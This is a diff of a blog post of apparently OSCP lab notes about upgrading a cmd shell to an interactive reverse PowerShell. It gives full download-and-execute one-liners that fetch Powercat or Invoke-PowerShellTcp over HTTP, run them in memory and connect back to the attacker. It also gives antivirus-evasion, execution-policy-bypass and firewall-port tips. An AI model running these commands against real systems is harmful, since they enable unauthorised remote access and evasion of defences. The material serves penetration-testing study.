@@ -32,12 +32,23 @@ Another easy way to transfer files is over http using python's SimpleHTTPServer 
 {: .text-justify}
 
 ---
-## PowerShell
+## Upgrading to PowerShell from cmd
 
-PowerShell provides an easy way to perform post exploitation and privilege escalation activities with the help of various PS modules. Two of the most useful modules that I came across were: [Nishang's Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) and [Powersploit's PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)   
+PowerShell provides an easy way to perform post exploitation and privilege escalation activities with the help of various PS modules. Three of the most useful modules that I came across were: [Powercat](https://github.com/besimorhino/powercat), [Nishang's Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) and [Powersploit's PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)   
 {: .text-justify}
 
-While most of the newer Windows OS have a functional antivirus monitoring and prohibiting the execution of programs from storage, PowerShell provides us with an option to bypass this and run programs directly from the memory. This can help us evade the antivirus and easily run exploits or post-exploitation scripts.
+While most of the newer Windows OS have a functional antivirus monitoring and prohibiting the execution of programs from storage, PowerShell provides us with an option to bypass this and run programs directly from the memory. This can help us evade the antivirus and easily run exploits or post-exploitation modules.
+{: .text-justify}
+
+In short, we need to execute either `Powercat.ps1` or `Invoke-PowerShellTcp.ps1` on victim to get an interactive PowerShell.
+There are two methods to do this:
+1. Download and Invoke the modules over HTTP: Using this method, we will download the modules to memory and invoke them without touching the disk. This can help us evade Windows Antivirus.
+2. Invoke the modules locally: This method can be used to invoke the ps1 modules when you have local access to those modules on  victim system. Since we are executing the modules from storage (drive Z), it has a good chance of getting blocked by the Windows Antivirus. 
+{: .text-justify}
+
+## Method 1: Download and Invoke the modules over HTTP (Evades Windows AV)
+
+As a general example, we can download and execute any file on the victim using following steps:  
 1. Share your files using python's `SimpleHTTPServer` or Apache.   
 ![image-center](/assets/images/oscp/1/http1.png)
 2. On the victim's cmd shell, execute the command:
@@ -46,43 +57,47 @@ This downloads `testfile` and executes it in the memory.
 ![image-center](/assets/images/oscp/1/http2.png)
 {: .text-justify}
 
-### Upgrading to PowerShell from cmd using Nishang
+### Reverse shell using Powercat
 
-The `Invoke-PowerShellTcp.ps1` can be used to get an interactive Reverse or Bind PowerShell from the target. This script is able to connect to an attacker's netcat listener using -Reverse switch or an attacker's netcat can connect to this script Bind to a specific port on the victim when using -Bind switch. For this exercise, we are assuming that you already have access to the victim (web command injection or a cmd shell using eternalblue/any other exploit) and will look at how this cmd shell can be upgraded to an interactive reverse PowerShell.
+1. Start python's `SimpleHTTPServer` and copy the `Powercat.ps1` to that directory.   
+![image-center](/assets/images/oscp/1/pcat1.png)
+2. Start netcat listener on your Kali (prefer using standard ports such as 80,443,53 since they have less chances of being blacklisted on the victim's firewall).
+3. On the victim: `powershell.exe -nop -ep bypass -c "iex ((New-Object Net.WebClient).DownloadString('http://<IP>/Powercat.ps1'));powercat -c <IP> -p <Port> -ep"`   
+![image-center](/assets/images/oscp/1/pcat2.png)
+4. This sends an interactive reverse PowerShell to our kali on port 443:  
+![image-center](/assets/images/oscp/1/pcat3.png) 
 {: .text-justify}
 
-### Method 1: Using HTTP (Can evade Windows AV)
+### Reverse shell using Invoke-PowerShellTcp.ps1
 
-We will share our `Invoke-PowerShellTcp.ps1` over http, download it to the victim, and execute it inside memory to send a reverse PowerShell.
 1. Start python's `SimpleHTTPServer` and copy the `Invoke-PowerShellTcp.ps1` to that directory.   
 ![image-center](/assets/images/oscp/1/httpps1.png)
-2. Start netcat listener on your Kali (always prefer using standard ports such as 80,443,53 since they have less chances of being blacklisted on the victim's firewall).
-3. On the victim, we can download and execute this script using command: `powershell.exe -nop -ep bypass -c "iex ((New-Object Net.WebClient).DownloadString('http://<IP>/Invoke-PowerShellTcp.ps1'));Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <Port>"`   
+2. Start netcat listener on your Kali.
+3. On the victim: `powershell.exe -nop -ep bypass -c "iex ((New-Object Net.WebClient).DownloadString('http://<IP>/Invoke-PowerShellTcp.ps1'));Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <Port>"`   
 ![image-center](/assets/images/oscp/1/httpps2.png)
 4. This sends an interactive reverse PowerShell to our kali on port 443:  
 ![image-center](/assets/images/oscp/1/httpps3.png) 
-5. This script can also be used to setup a bind shell on the victim using `-Bind` switch but I preferred using reverse shells in the PWK lab.
 {: .text-justify}
 
 ### Command breakdown
-
-Let's see the breakdown:   
+  
 `powershell.exe -nop -ep bypass -c "<Command>"` : We are executing powershell using three arguments:
-1. `-nop` or `NoProfile` : This option means that the currently active user’s profile will not be loaded.
-2. `-ep bypass` or `-ExecutionPolicy Bypass` : Execution Policy restricts script execution on most systems on the default setting This can be overcome by giving Bypass value to the value of -ExecutionPolicy parameter. 
-3. `-c` or `-Command` : This is used to specify a command to be executed.
-	- `"iex ((New-Object Net.WebClient).DownloadString('http://<IP>/Invoke-PowerShellTcp.ps1'))` : This part of the command downloads the `Invoke-PowerShellTcp.ps1` file.
-	- `Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <Port>"` : These are the arguments passed to `Invoke-PowerShellTcp.ps1` module. More arguments or examples can be seen on Nishang's github.
-	- Pro tip: you can append the `Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <port>` to your `Invoke-PowerShellTcp.ps1`. Example:
-		![image-center](/assets/images/oscp/1/Invoke-ps1.png)
-	This way, your final command for reverse shell would just be downloading and invoking the module, you don't have to pass the arguments anymore. Final command:   
-	`powershell.exe -nop -ep bypass -c "iex ((New-Object Net.WebClient).DownloadString('http://<IP>/Invoke-PowerShellTcp.ps1'))`
+1. `-nop` or `NoProfile` : Currently active user’s profile will not be loaded.
+2. `-ep bypass` or `-ExecutionPolicy Bypass` : Execution Policy restricts script execution on most systems on the default setting. This can be overcome by giving Bypass value to the value of -ExecutionPolicy parameter. 
+3. `-c` or `-Command` : Specify a command to be executed.
+- Bonus: you can append the the execution command to your `ps1` module and avoid one extra step.  
+Example for `Invoke-PowerShellTcp.ps1`:
+![image-center](/assets/images/oscp/1/Invoke-ps1.png)
+This way, your final command for reverse shell would just be downloading and auto-invoking the module, you don't have to pass the arguments anymore.  
+Final command:   `powershell.exe -nop -ep bypass -c "iex ((New-Object Net.WebClient).DownloadString('http://<IP>/Invoke-PowerShellTcp.ps1'))`
 {: .text-justify}
 
+An important thing to keep in mind is that both Powercat and Nishang modules are not just limited to reverse shells but also provide a lot of other useful functionality. Now that we know how to execute these modules, you should further look at the additional features and decide which benefit you the most.
+{: .text-justify}
 
-### Method 2: Using SMB (Gets blocked by Windows AV)
+## Method 2: Invoking modules locally: using SMB (Gets blocked by Windows AV)
 
-While this method is convenient for sharing multiple files over smb, but since we are executing `Invoke-PowerShellTcp.ps1` from storage (drive Z), it has a good chance of getting blocked by the Windows Antivirus. 
+This method can be used to invoke ps1 modules locally on your victim system. Since we are executing the scripts from storage (drive Z), it has a good chance of getting blocked by the Windows Antivirus. We will take a look at how to send reverse PowerShell using Invoke-PowerShellTcp.ps1:  
 1. On your Kali, copy `Invoke-PowerShellTcp.ps1` inside `myshare` and start the smbserver. 
 2. Start netcat listener on Kali.
 3. You can mount the smbshare as Z, change dir to Z, and execute the script with command:
@@ -96,6 +111,7 @@ While this method is convenient for sharing multiple files over smb, but since w
 ---
 
 ## lpeworkshop
+
 For the setup, we need three things:
 1. Windows 7/10
 We can grab a free copy of Windows Evaluation versions directly from [Microsoft](https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/) or from [magnetikonline's github repo](https://github.com/magnetikonline/linux-microsoft-ie-virtual-machines). Prefer getting a Windows 7 as this workshop was developed and tested on a Windows 7 (SP1) x64 host. 
@@ -108,6 +124,7 @@ The setup is fairly simple: Copy the lpe_windows_setup.bat script to VM and run 
 {: .text-justify}
 
 In the next part, we will go through the exercises from lpeworkshop and see how we can identify and exploit the vulnerabilties with the help of `PowerUp.ps1` 
+{: .text-justify}
 
 ---
 ## Additional resources
